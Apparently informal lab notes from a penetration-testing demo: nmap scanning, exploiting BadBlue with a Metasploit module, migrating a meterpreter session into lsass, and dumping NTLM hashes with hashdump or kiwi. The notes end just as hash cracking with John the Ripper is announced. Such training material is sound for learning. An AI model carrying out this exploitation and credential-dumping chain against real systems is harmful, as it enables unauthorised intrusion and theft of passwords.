demo:

nmap -sV <ip>
we found badblue open
lets exploit using msfconsole exploit module
>search badblue_passthru
exploit

we got meterpreter session
>sysinfo
>getuid
getprivs
we have administrative privilafes

now for dumping the passwords
we need to migrate to lsas process
as it is more assositaed with authentication and authroisation 
ans may stores password in cache
pgrep lsass
migrate <pid>
>hashdump
or load kiwi module we alreddy did that

=> we got the ntlm hash 
 
 copy the hash and save it in hashs.txt file
 
 ## now we jonna crack the hashes using john the ripper
